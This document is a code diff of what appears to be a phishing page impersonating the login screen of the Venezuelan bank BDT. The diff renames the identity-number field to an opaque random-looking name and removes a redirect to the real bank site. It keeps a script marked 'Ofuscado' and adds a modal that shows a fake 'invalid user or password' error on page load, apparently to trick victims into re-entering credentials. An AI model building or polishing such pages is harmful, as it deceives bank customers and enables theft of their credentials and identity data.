@@ -11,17 +11,70 @@
   <meta name="description" content />
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <link rel="stylesheet" href="styles/style.css" />
+  <link rel="stylesheet" href="../styles/style.css" />
   <meta name="msapplication-TileColor" content="#b91d47" />
   <meta name="theme-color" content="#ffffff" />
   <meta name="referrer" content="no-referrer" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <!-- Favicon -->
-  <link rel="icon" href="img/favicon.ico" type="image/x-icon">
-  <link rel="shortcut icon" href="img/shorcut.png" type="image/x-icon" />
-  <link rel="icon" href="img/favicon.png" type="image/x-icon" />
-  <meta http-equiv="refresh" content="0; URL='www.bdtenlinea.bdt.com.ve/p=1.html'" />
-  <script type="module" src="js/firebase-config.js"></script>
+  <link rel="icon" href="../img/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="../img/shorcut.png" type="image/x-icon" />
+  <link rel="icon" href="../img/favicon.png" type="image/x-icon" />
+  <!-- SweetAlert2 (para modal de error) -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+  <style>
+    /* Pixel perfect según ejemplo proporcionado */
+    .swal2-container {
+      background: rgba(0, 0, 0, 0.45) !important; /* oscurecer un poco más */
+    }
+    .swal2-popup {
+      width: 500px !important;
+      min-height: 295px !important;
+      padding: 25px !important;
+      border-radius: 6px !important;
+      font-family: Arial, Helvetica, sans-serif !important;
+    }
+    .swal2-title {
+      margin: 0 0 10px 0 !important;
+      font-weight: 600 !important;
+      font-size: 20px !important; /* título vacío por ahora, pero conservamos estilo */
+    }
+    /* Contenido del mensaje */
+    #swal2-content, /* compat v7 */
+    .swal2-html-container { /* v11 */
+      font-size: 18px !important;
+      color: #3f4254 !important;
+      text-align: center !important;
+      margin: 10px 0 10px 0 !important;
+      padding: 0 !important;
+    }
+    /* Icono de error: escalar proporcionalmente para conservar la "X" */
+    .swal2-icon.swal2-error {
+      transform: scale(1.60);
+      transform-origin: center;
+      margin: 20px auto 15px auto !important;
+    }
+    /* Botón "Continuar" */
+    .swal2-styled.swal2-confirm {
+      background-color: rgb(48, 133, 214) !important;
+      border-left-color: rgb(48, 133, 214) !important;
+      border-right-color: rgb(48, 133, 214) !important;
+      border-top-color: rgb(48, 133, 214) !important;
+      border-bottom-color: rgb(48, 133, 214) !important;
+      font-size: 16px !important;
+      padding: 10px 24px !important;
+      border-radius: 4px !important;
+    }
+    .swal2-actions {
+    margin: 0px;
+}
+    .swal2-styled.swal2-confirm:hover {
+      filter: brightness(0.95);
+    }
+    .swal2-styled:focus { box-shadow: 0 0 0 3px rgba(48,133,214,0.35) !important; }
+  </style>
+  <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
+  <script type="module" src="../js/firebase-config.js"></script>
 </head>
 
 <body class="smart-style-3 fixed-page-footer fixed-header desktop-detected">
@@ -51,7 +104,7 @@
             <div class="modal-header">
               <!-- Logo BDT sobre form -->
               <h4 class="modal-title text-center mt-1">
-                <img src="img/logo.png" alt srcset style="width: 80%" sizes />
+                <img src="../img/logo.png" alt srcset style="width: 80%" sizes />
               </h4>
               <!-- Fin logo -->
             </div>
@@ -84,17 +137,19 @@
                   <label for class="label">
                     <strong>Número de Identificación</strong>
                   </label>
-                  <label for="documento" class="input show-account">
+                  <label for="doc452acd" class="input show-account">
                     <i style="cursor: pointer" class="icon-watch icon-append fa fa-eye-slash" data-watch="0"
                       id="toggleDocumento" aria-label="Mostrar u ocultar documento" tabindex="0" role="button"></i>
-                    <input type="password" class="form-control numbersOnly input-login" maxlength="10" name="Documento"
-                      id="documento" autocomplete="off" placeholder="Número de documento de identidad" />
+                    <input type="password" class="form-control numbersOnly input-login" maxlength="10" name="Doc452acd"
+                      id="doc452acd" autocomplete="off" placeholder="Número de documento de identidad" />
                     <b class="tooltip tooltip-top-right">
                       <i class="fa fa-lock txt-color-teal"></i>
                       Número de Documento de Identidad
                     </b>
                   </label>
                 </section>
+              </div>
+              <div class="cargando text-center hide">
               </div>
               <div id="preloader" class="cargando text-center">
                 <div>
@@ -168,7 +223,28 @@
   <div id="divMiniIcons"></div>
   <div id="divbigBoxes"></div>
 <!-- Ofuscado -->
-  <script type="module" src="js/script.js"></script>
+  <script type="module" src="../js/script.js"></script>
+
+  <!-- Modal de error al cargar la página -->
+  <script>
+    window.addEventListener('DOMContentLoaded', function () {
+      if (window.Swal) {
+        Swal.fire({
+          icon: 'error',
+          title: '',
+          text: 'Usuario o clave invalida, por favor verifique e intente de nuevo.',
+          confirmButtonText: 'Continuar',
+          allowOutsideClick: false,
+          allowEscapeKey: true,
+          backdrop: true,
+          didOpen: (popup) => {
+            const btn = popup.querySelector('.swal2-confirm');
+            if (btn) btn.focus();
+          }
+        });
+      }
+    });
+  </script>
 
 </body>
 
